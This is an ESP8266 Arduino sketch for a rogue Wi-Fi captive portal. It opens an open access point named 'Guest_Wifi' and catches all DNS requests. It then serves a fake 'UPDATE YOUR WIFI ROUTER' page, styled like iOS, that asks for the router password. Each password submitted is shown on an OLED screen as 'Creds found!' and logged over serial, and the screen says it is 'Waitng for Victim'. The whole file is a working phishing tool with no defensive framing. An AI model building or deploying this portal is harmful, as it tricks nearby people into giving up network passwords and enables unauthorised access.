#include <ESP8266WiFi.h>
#include "SH1106Wire.h"
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include "Graphics.h"
SH1106Wire display(0x3C, SDA, SCL); // use builtin i2C
const char MAIN_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #f0f0f0;
      text-align: center;
      margin: 50px;
    }

    h3 {
      color: #007aff; /* iOS blue */
    }

    form {
      max-width: 300px;
      margin: 0 auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    input[type=password] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      box-sizing: border-box;
      color:#8e9191;
      background-color: #d4d4d4; /* iOS blue */
      border: 1px solid #a7aaab; /* iOS text input border color */
      border-radius: 10px;
    }

    input[type=submit] {
      background-color: #007aff; /* iOS blue */
      color: white;
      padding: 12px 20px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-weight: bold; /* Add bold weight to the font */
      cursor: pointer;
    }

    input[type=submit]:hover {
      background-color: #0056b3; /* Slightly darker blue on hover */
    }
  </style>
</head>

<body>
  <h3>UPDATE YOUR WIFI ROUTER</h3>
  <form action="/update">
    Please Authorize to continue:<br>
    <input type="password" name="passwd" placeholder="PASSWORD">
    <br>
    <input type="submit" value="Submit">
  </form>
</body>

</html>
)=====";




const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
String ipString = apIP.toString();
String displayIP = "IP: " + ipString;

DNSServer dnsServer;
ESP8266WebServer server(80); 

//ip on browser routine
void handleRoot() {
 String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", s); //Send web page
}
//submit button routine 
void handleForm() {
 String passwd = server.arg("passwd");
 display.clear(); 
 display.drawXbm(4,0,128,64,attack_bits);
 display.drawLine(0, 54, 128, 54);
 display.drawLine(0, 53, 128, 53);
 display.drawString(0,10,"Creds found!"); 
 display.drawString(0,20,passwd);
 display.drawString(0,54,"CAPTIVE PORTAL");
 display.display();
 Serial.println(passwd); 
 //String s = "<a href='/'> Go Back </a>";
 //server.send(200, "text/html", s); //Send web page
}
//SETUP
void setup(void){
  Serial.begin(9600);
    // add to menu interface init
  display.init();
  display.flipScreenVertically();
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.setFont(DejaVu_Sans_Mono_10);
  display.drawXbm(0,0,128,64,invader_bits);
  display.display();
  delay(1500);
  display.clear(); display.display();
  display.drawString(0,10,"Waitng for");
  display.drawString(0,20,"Victim on");
  display.drawString(0,30,"Address IP:");
  display.drawString(0,40,ipString);
  
  display.drawXbm(0,0,128,64,invader_attack_bits);
  display.drawLine(0, 54, 128, 54);
  display.drawLine(0, 53, 128, 53);
  display.drawString(0,54,"CAPTIVE PORTAL");
  display.display();
  WiFi.mode(WIFI_AP);

  WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
  const char *ssid = "Guest_Wifi";
  const char *password = NULL;
  WiFi.softAP(ssid, password);  
  Serial.println("");

  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  server.on("/", handleRoot);
  server.on("/update", handleForm);
  server.onNotFound(handleRoot);
  server.begin();                  
  Serial.println("HTTP server started");
}

void loop(void){
  dnsServer.processNextRequest();
  server.handleClient();          //Handle client requests
}
